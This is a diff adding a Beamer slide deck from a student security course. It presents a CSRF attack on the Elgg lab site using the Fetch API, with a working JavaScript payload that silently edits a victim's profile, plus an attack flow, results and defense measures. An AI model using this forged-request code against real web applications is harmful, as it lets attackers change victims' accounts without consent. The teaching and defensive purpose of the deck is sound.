@@ -1,0 +1,235 @@
+% =====================================================================
+%  SLIDES (Beamer/metropolis) — CSRF on Elgg via Fetch API (English)
+%  Compile: xelatex slides_en.tex  (run 2x)
+% =====================================================================
+\documentclass[11pt,aspectratio=169]{beamer}
+\usetheme{metropolis}
+\metroset{progressbar=frametitle,numbering=fraction,block=fill}
+
+\usepackage{fontspec}
+\setsansfont{TeX Gyre Heros}
+\setmonofont{Noto Sans Mono}[Scale=0.82]
+\usepackage[english]{babel}
+
+\definecolor{navy}{HTML}{1E3C72}
+\definecolor{brandblue}{HTML}{2A5298}
+\definecolor{accent}{HTML}{2563EB}
+\definecolor{danger}{HTML}{DC2626}
+\definecolor{success}{HTML}{15803D}
+\definecolor{amber}{HTML}{B45309}
+\definecolor{slate}{HTML}{475569}
+\definecolor{ink}{HTML}{0F172A}
+\definecolor{mist}{HTML}{F1F5F9}
+\setbeamercolor{frametitle}{bg=navy}
+\setbeamercolor{progress bar}{fg=accent,bg=mist}
+\setbeamercolor{title separator}{fg=accent}
+\setbeamercolor{alerted text}{fg=danger}
+\setbeamercolor{block title}{bg=brandblue,fg=white}
+\setbeamercolor{block body}{bg=mist}
+\setbeamercolor{block title alerted}{bg=danger,fg=white}
+\setbeamercolor{block body alerted}{bg=danger!8,fg=black}
+\setbeamercolor{block title example}{bg=success,fg=white}
+\setbeamercolor{block body example}{bg=success!8,fg=black}
+
+\usepackage{tikz}
+\usetikzlibrary{arrows.meta,positioning,calc}
+\usepackage{booktabs}
+\usepackage{listings}
+\definecolor{codebg}{HTML}{0F172A}\definecolor{codefg}{HTML}{E2E8F0}
+\definecolor{codekey}{HTML}{38BDF8}\definecolor{codestr}{HTML}{86EFAC}
+\definecolor{codecom}{HTML}{94A3B8}\definecolor{line}{HTML}{CBD5E1}
+\lstset{basicstyle=\scriptsize\ttfamily\color{codefg},backgroundcolor=\color{codebg},
+  keywordstyle=\color{codekey}\bfseries,stringstyle=\color{codestr},
+  commentstyle=\color{codecom}\itshape,frame=single,framerule=0pt,
+  rulecolor=\color{codebg},showstringspaces=false,breaklines=true,
+  columns=fullflexible,keepspaces=true,xleftmargin=8pt,aboveskip=4pt,belowskip=2pt}
+\lstdefinelanguage{JS}{keywords={const,let,new,async,await,fetch,return,function},
+  morekeywords=[2]{URLSearchParams,FormData,append,addEventListener},
+  keywordstyle=[2]\color{codestr}\bfseries,sensitive=true,
+  morecomment=[l]{//},morestring=[b]',morestring=[b]"}
+\usepackage{pifont}
+\newcommand{\yes}{\textcolor{success}{\ding{52}}}
+\newcommand{\no}{\textcolor{danger}{\ding{56}}}
+
+% English labels for the sequence diagram (before \input)
+\newcommand{\lblVictim}{Alice (victim) + Browser}
+\newcommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
+\newcommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
+\newcommand{\lblSa}{1. Legitimate login}
+\newcommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
+\newcommand{\lblSc}{3. Unknowingly opens malicious page}
+\newcommand{\lblSd}{4. Returns \texttt{index.html} (Fetch script)}
+\newcommand{\lblNe}{5. Script auto-runs (\texttt{DOMContentLoaded})}
+\newcommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
+\newcommand{\lblNg}{7. Valid cookie $\Rightarrow$ update About me}
+\newcommand{\lblSh}{8. Response 302 (opaque)}
+\newcommand{\lblSi}{9. Re-check profile $\to$ changed}
+\input{diagram_flow}
+
+\title{CSRF attack on Elgg via Fetch API}
+\subtitle{Replacing XMLHttpRequest / form submit with modern \texttt{fetch()}}
+\author{Group 3 — \textit{M1 · M2 · M3}}
+\institute{Information Systems Security}
+\date{\today}
+
+\begin{document}
+
+{\setbeamercolor{background canvas}{bg=navy}
+\setbeamercolor{normal text}{fg=white}
+\setbeamercolor{title}{fg=white}\setbeamercolor{subtitle}{fg=mist}
+\setbeamercolor{author}{fg=mist}\setbeamercolor{institute}{fg=mist}\setbeamercolor{date}{fg=mist}
+\begin{frame}[plain]\titlepage\end{frame}}
+
+\begin{frame}{Outline}
+  \setbeamertemplate{section in toc}[sections numbered]
+  \tableofcontents
+\end{frame}
+
+% ===============================================================
+\section{Team \& Overview}
+
+\begin{frame}{Task allocation (Group of 3 — two-tier model)}
+  \textbf{Tier 1 — Shared baseline (mandatory for 100\% of members):} each runs Docker, captures the packet, changes About me to their own ID, and joins a cross Q\&A on all 15 questions.
+  \vfill
+  \begin{columns}[t]
+    \column{0.33\textwidth}
+      \begin{block}{M1 — Offensive}
+        \scriptsize Docker, packet capture, \texttt{index.html} + \texttt{exploit.py}. \\ Q\&A 4–8.
+      \end{block}
+    \column{0.33\textwidth}
+      \begin{block}{M2 — Browser/Defense}
+        \scriptsize Browser/CORS/SameSite analysis, recording \& editing. \\ Q\&A 1,3,10–14.
+      \end{block}
+    \column{0.33\textwidth}
+      \begin{block}{M3 — Research/Slides}
+        \scriptsize Slides, diagrams, report, defense verification. \\ Q\&A 2,9,15.
+      \end{block}
+  \end{columns}
+\end{frame}
+
+\begin{frame}{What is CSRF?}
+  \alert{Cross-Site Request Forgery} — the attacker tricks a \emph{logged-in} victim's browser into sending a forged request to the target server.
+  \vfill
+  \textbf{Three required conditions:}
+  \begin{enumerate}
+    \item The victim has an active session (session cookie).
+    \item A state-changing action with \alert{predictable} parameters.
+    \item The app \alert{lacks defenses} (no SameSite, no token).
+  \end{enumerate}
+  \vfill
+  \footnotesize\textbf{Goal:} change Alice's \emph{About me} field to \texttt{CSRF attack by <ID>}.
+\end{frame}
+
+% ===============================================================
+\section{Fetch API attack technique}
+
+\begin{frame}{Improvement: from XHR/Form to Fetch API}
+  \begin{center}\footnotesize
+  \begin{tabular}{lccc}
+    \toprule
+    \textbf{Criterion} & \textbf{Form submit} & \textbf{XHR} & \textbf{Fetch API}\\
+    \midrule
+    Stealth (no page change) & \no & \yes & \yes\\
+    Modern syntax (async) & \no & \no & \yes\\
+    Assignment & \no{} banned & \no{} banned & \yes{} required\\
+    \bottomrule
+  \end{tabular}
+  \end{center}
+  \medskip
+  \begin{alertblock}{Two key flags}
+    \footnotesize
+    \texttt{credentials: 'include'} → forces the browser to attach the session cookie cross-origin.\\
+    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{no} Preflight.
+  \end{alertblock}
+\end{frame}
+
+\begin{frame}[fragile]{Packet analysis \& exploit code}
+  \scriptsize Endpoint: \texttt{POST http://www.seed-server.com/action/profile/edit}
+  \begin{lstlisting}[language=JS]
+const payload = new URLSearchParams();
+payload.append('name', 'Alice');
+payload.append('description', '<p>CSRF attack by B21DCCN001</p>');
+payload.append('accesslevel[description]', '2');   // 2 = Public
+payload.append('guid', '42');                       // Alice's GUID
+fetch('http://www.seed-server.com/action/profile/edit', {
+  method: 'POST',
+  mode: 'no-cors',          // Simple Request -> no Preflight
+  credentials: 'include',   // REQUIRED: attach session cookie
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: payload
+});
+  \end{lstlisting}
+  \footnotesize \texttt{FormData} variant: do not set \texttt{Content-Type} manually (browser generates the boundary).
+\end{frame}
+
+% ===============================================================
+\section{Attack flow \& Results}
+
+\begin{frame}{Attack flow diagram}
+  \begin{center}
+  \scalebox{0.58}{\csrfflowdiagram}
+  \end{center}
+\end{frame}
+
+\begin{frame}{Experimental evidence}
+  \begin{columns}[t]
+    \column{0.33\textwidth}\centering
+      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Before}\\[3pt]Original About me}}
+      \\[4pt]\scriptsize Alice's original profile
+    \column{0.33\textwidth}\centering
+      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{During}\\[3pt]F12 console: Fetch POST}}
+      \\[4pt]\scriptsize Silent, no page change
+    \column{0.33\textwidth}\centering
+      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{After}\\[3pt]\texttt{CSRF attack by <ID>}}}
+      \\[4pt]\scriptsize About me changed
+  \end{columns}
+  \vfill
+  \begin{exampleblock}{Result}
+    \small Fully successful attack — no warning, no redirect (undefended configuration).
+  \end{exampleblock}
+\end{frame}
+
+% ===============================================================
+\section{Defense \& Conclusion}
+
+\begin{frame}{Defense-in-Depth}
+  \footnotesize
+  \begin{tabular}{ll}
+    \toprule
+    \textbf{Layer} & \textbf{Measure}\\
+    \midrule
+    Cookie & \texttt{SameSite=Lax/Strict} — no cookies sent cross-site\\
+    Application & Anti-CSRF token — attacker cannot read it (SOP)\\
+    Application & Double Submit Cookie\\
+    Header & Check \texttt{Origin} / \texttt{Sec-Fetch-Site}\\
+    UI & \texttt{X-Frame-Options} / CSP \texttt{frame-ancestors}\\
+    \bottomrule
+  \end{tabular}
+  \medskip
+  \begin{block}{Defense evidence}
+    \footnotesize Re-enable Elgg's anti-CSRF token → the same payload \alert{fails} (missing \texttt{\_\_elgg\_token}). About me \textbf{unchanged}.
+  \end{block}
+\end{frame}
+
+\begin{frame}{AI disclosure \& Conclusion}
+  \textbf{AI-usage disclosure:}
+  \begin{itemize}\small
+    \item \textbf{Level 1:} debated CORS/Simple Request mechanisms — students coded themselves.
+    \item \textbf{Level 2:} AI co-created formatting and diagrams following the group's design.
+    \item \textbf{Level 3:} AI generated the \texttt{exploit.py}/template skeleton; the group configured \& tested.
+  \end{itemize}
+  \vfill
+  \begin{alertblock}{Core message}
+    \small CSRF is \textbf{not} stopped by HTTPS. The fundamental fix: \texttt{SameSite} cookies + anti-CSRF token + request-origin checks. \textit{Learn attacks to defend.}
+  \end{alertblock}
+\end{frame}
+
+{\setbeamercolor{background canvas}{bg=navy}
+\begin{frame}[plain]
+  \centering\vfill
+  {\color{white}\Huge\textbf{Thank you!}}\\[10pt]
+  {\color{mist}\large Questions \& Answers}
+  \vfill
+\end{frame}}
+
+\end{document}
